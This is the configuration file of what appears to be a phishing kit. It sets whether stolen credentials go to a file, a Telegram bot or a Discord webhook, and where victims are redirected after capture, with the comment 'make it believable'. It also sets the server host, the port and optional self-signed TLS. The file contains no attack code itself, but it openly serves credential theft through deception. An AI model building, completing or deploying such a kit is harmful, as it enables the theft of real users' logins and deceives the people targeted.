# phishkit config

# Where to send captured credentials
# Options: "file", "telegram", "discord"
CAPTURE_MODE = "file"

# Telegram (if CAPTURE_MODE = "telegram")
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

# Discord (if CAPTURE_MODE = "discord")
DISCORD_WEBHOOK = ""

# Redirect victim here after capture (make it believable)
REDIRECT_URL = "https://www.google.com"

# Server
HOST = "0.0.0.0"
PORT = 8080

# Optional TLS (self-signed)
USE_TLS = False
TLS_CERT = "cert.pem"
TLS_KEY = "key.pem"
